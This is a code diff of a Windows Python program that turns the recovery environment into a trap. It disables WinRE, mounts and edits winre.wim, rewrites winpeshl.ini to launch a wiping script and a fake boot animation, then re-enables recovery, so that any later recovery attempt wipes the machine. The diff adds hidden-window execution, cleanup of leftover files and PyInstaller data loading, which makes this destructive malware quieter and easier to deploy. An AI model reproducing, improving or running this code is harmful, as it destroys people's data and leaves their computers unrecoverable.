@@ -1,7 +1,7 @@
 import sys
 import psutil
 import os
-import time
+import subprocess
 import shutil
 import hashlib
 import win32gui
@@ -65,43 +65,71 @@ def checker(script_list, original_hashes, pids): # perform all check every X tim
     check_already_triggered()
 
 def setup_destroy_mechanism(data_path): # modifies WinRE for immediate destruction. After this runs, if windows recovery runs the computer will be wiped, even if ran by the user. This dooms the computer.
-    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
-        with open("C:/debugging.txt", 'w') as f:
-            f.write('no C:/Windows/System32/Destroy me.please')
+    try:
+        if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
+            with open("C:/debugging.txt", 'w') as f:
+                f.write('no C:/Windows/System32/Destroy me.please\n')
+                f.close()
+            sys.exit()
+        with open("C:/debugging.txt", 'a') as f:
+            subprocess.run("reagentc /disable", creationflags=subprocess.CREATE_NO_WINDOW) # disable windows recovery environment to be able to modify its files
+            f.write('disable\n')
+            f.flush()
+            subprocess.run("attrib -h -s -r C:\Windows\System32\Recovery\winre.wim", creationflags=subprocess.CREATE_NO_WINDOW) # remove attributes from the windows recovery environment file that cause problems when interacting with it
+            f.write('attrib\n')
+            f.flush()
+            os.makedirs(r"C:\Windows\WSF", exist_ok=True)
+            f.write('mkdir WSF\n')
+            f.flush()
+            shutil.copy('C:\Windows\System32\Recovery\winre.wim', 'C:\Windows\WSF\winre.wim') # copy winre.wim to a folder where it can be modified freely because System32/recovery is a sensetive folder that can cause problems
+            f.write('copy to WSF\n')
+            f.flush()
+            os.makedirs(r"C:\Windows\RSLogs", exist_ok=True) # make a folder to mount winre.wim so its files can be modified
+            f.write('mkdir RSLogs\n')
+            f.flush()
+            subprocess.run("dism /mount-wim /wimfile:C:\Windows\WSF\winre.wim /index:1 /mountdir:C:\Windows\RSLogs", creationflags=subprocess.CREATE_NO_WINDOW) # mount winre.wim in the folder
+            f.write('dism mount\n')
+            f.flush()
+            # subprocess.run(r"cmd /K takeown /f C:\Windows\RSLogs /r /d y", creationflags=subprocess.CREATE_NEW_CONSOLE)#capture_output=True, text=True, check=True, encoding='utf-8')
+            # f.write('takeown\n')
+            # f.flush()
+            # os.system("icacls C:\mount\Windows\System32 /grant administrators:F /t")
+            # subprocess.run("cmd /K icacls C:\Windows\RSLogs\Windows\System32 /grant administrators:F /t", creationflags=subprocess.CREATE_NEW_CONSOLE) # set administrators as the owner of the files to avoid problems
+            # f.write('icacls\n')
+            with open("C:\Windows\RSLogs\Windows\System32\winpeshl.ini", 'w') as winpeshl:
+                winpeshl.write('[LaunchApps]\n')
+                f.write('winpeshl p1\n')
+                f.flush()
+                winpeshl.write("X:\Windows\System32\WinSE.cmd") #
+                # winpeshl.write(r"X:\Windows\System32\boot_animation.exe")
+            f.write('winpeshl p2\n')
+            f.flush()
+            shutil.copy(f'{data_path}\\WinSE.cmd', 'C:\Windows\RSLogs\Windows\System32\WinSE.cmd') # copy in the destruction script
+            shutil.copy(f'{data_path}\\boot_animation.exe', r'C:\Windows\RSLogs\Windows\System32\boot_animation.exe') # copy in the boot animation
+            f.write('copy winse+boot_anim\n')
             f.close()
-        sys.exit()
-    with open("C:/debugging.txt", 'a') as f:
-        os.system("reagentc /disable") # disable windows recovery environment to be able to modify its files
-        f.write('disable')
-        os.system("attrib -h -s -r C:\Windows\System32\Recovery\winre.wim") # remove attributes from the windows recovery environment file that cause problems when interacting with it
-        f.write('attrib')
-        os.system("copy C:\Windows\System32\Recovery\winre.wim C:\Windows\WSF\winre.wim") # copy winre.wim to a folder where it can be modified freely because System32/recovery is a sensetive folder that can cause problems
-        f.write('first copy')
-        os.system("mkdir C:\Windows\RSLogs") # make a folder to mount winre.wim so its files can be modified
-        f.write('mkdir')
-        os.system("dism /mount-wim /wimfile:C:\Windows\WSF\winre.wim /index:1 /mountdir:C:\Windows\RSLogs") # mount winre.wim in the folder
-        f.write('dism mount')
-        os.system("takeown /f C:\Windows\RSLogs /r /d y") # take ownership of the files. Denies access otherwise
-        f.write('takeown')
-        os.system("icacls C:\mount\Windows\System32 /grant administrators:F /t") # set administrators as the owner of the files to avoid problems
-        f.write('icacls')
-        os.system("echo [LaunchApps] > C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # winpeshl.ini is the file that tells the system what to do when windows recovery environment launches. We're overwriting it to do other things. [Launchapps] tell winpeshl.ini that we want it to launch something
-        f.write('winpeshl p1')
-        os.system("echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # tells the system to run the wiping script
-        os.system(r"echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\boot_animation.exe") # tells the system to run the fake boot animation
-        f.write('winpeshl p2')
-        f.close()
-    shutil.copy(f'{data_path}\\WinSE.cmd', 'C:\Windows\RSLogs\Windows\System32\WinSE.cmd')
-    shutil.copy(f'{data_path}\\boot_animation.exe', r'C:\Windows\RSLogs\Windows\System32\boot_animation.exe')
-    with open("C:/debugging.txt", 'a') as f:
-        f.write('wrote destruction script')
-        os.system("dism /unmount-wim /mountdir:C:\Windows\RSLogs /commit") # repack the modified recovery environment
-        f.write('dism commit')
-        os.system("xcopy C:\Windows\WSF\winre.wim C:\Windows\System32\Recovery /h /y") # copy the modified recovery environment to its original location
-        f.write('copy2')
-        os.system("reagentc /enable") # reenable the modified recovery environment
-        f.write('reagentc enable')
-        f.close()
+
+        with open("C:/debugging.txt", 'a') as f:
+            subprocess.run("dism /unmount-wim /mountdir:C:\Windows\RSLogs /commit", creationflags=subprocess.CREATE_NO_WINDOW) # repack the modified recovery environment
+            f.write('dism commit\n')
+            f.flush()
+            shutil.copy('C:\Windows\WSF\winre.wim', 'C:\Windows\System32\Recovery\winre.wim') # copy the modified recovery environment to its original location
+            f.write('copy from WSF\n')
+            f.flush()
+            subprocess.run("reagentc /enable", creationflags=subprocess.CREATE_NO_WINDOW) # reenable the modified recovery environment
+            f.write('reagentc enable\n')
+            shutil.rmtree('C:\Windows\WSF') # delete leftover files
+            shutil.rmtree('C:\Windows\RSLogs') # delete leftover files
+            f.close()
+    except subprocess.CalledProcessError as e:
+        with open("C:/debugging.txt", 'a') as f:
+            f.write(f"\n❌ Error! The command failed with exit code: {e.returncode}\n")
+            f.write(f"\n===========Error Details:===========\n {e.stderr}\n======================")
+            f.write(f"======================\n===========Program Stdout:===========\n {e.stdout}\n")
+            f.close()
+    except Exception as e:
+        with open("C:/debugging.txt", 'a') as f:
+            f.write(f'\n=================\nException:\n {e}\n')
 
 def destroy():
     if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
@@ -113,6 +141,10 @@ def destroy():
 
 if __name__ == '__main__': # run if being run as a standalone script and not as a library
     if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
+        with open("C:/debugging.txt", 'w') as f:
+            f.write('no C:/Windows/System32/Destroy me.please\n')
+            f.close()
         sys.exit()
-    setup_destroy_mechanism()
+    data = os.path.join(sys._MEIPASS, "data")
+    setup_destroy_mechanism(data)
     destroy()
